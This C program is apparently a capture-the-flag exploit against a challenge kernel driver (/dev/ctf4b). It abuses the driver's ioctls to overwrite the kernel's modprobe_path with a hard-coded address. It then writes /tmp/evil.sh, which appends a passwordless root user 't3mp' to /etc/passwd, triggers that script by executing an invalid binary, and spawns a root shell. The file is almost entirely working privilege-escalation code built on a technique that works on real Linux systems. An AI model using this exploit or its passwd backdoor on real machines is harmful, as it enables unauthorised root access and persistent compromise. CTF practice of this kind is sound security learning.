#include "../src/ctf4b.h"
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define ulong unsigned long

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}

int main() {
  char *buf;
  int fd;

  ulong modprobe_path = 0xffffffff81e3a080;
  printf("[i] modprobe_path: 0x%016lx\n", modprobe_path);

  fd = open("/dev/ctf4b", O_RDWR);
  if (fd == -1)
    fatal("/dev/ctf4b");

  buf = (char*)malloc(0x100);
  if (!buf) {
    close(fd);
    fatal("malloc");
  }

  /* Update message */
  puts("[+] Update g_message");
  memset(buf, 0, 0x100);
  strcpy(buf, "/tmp/evil.sh");
  ioctl(fd, CTF4B_IOCTL_STORE, buf);

  /* Prepare evil script */
  puts("[+] Prepare evil script (/tmp/evil.sh)");
  FILE *file = fopen("/tmp/evil.sh", "w");
  if (file == NULL)
    fatal("evil.sh");
  fprintf(file, "#!/bin/sh\necho \"t3mp::0:0:root:/root:/bin/sh\" >> /etc/passwd\n");
  fclose(file);
  system("chmod +x /tmp/evil.sh");

  /* Overwrite modprobe_path */
  puts("[+] Overwrite modprobe_path");
  char* ptr = (char*)modprobe_path;
  ioctl(fd, CTF4B_IOCTL_LOAD, ptr);

  puts("[+] Execute invalid binary (/tmp/pwn)");
  system("echo -e '\xde\xad\xbe\xef' > /tmp/pwn");
  system("chmod +x /tmp/pwn");
  system("/tmp/pwn");

  free(buf);
  close(fd);

  puts("[+] Spawning root shell...");
  system("su -c sh t3mp");

  return 0;
}
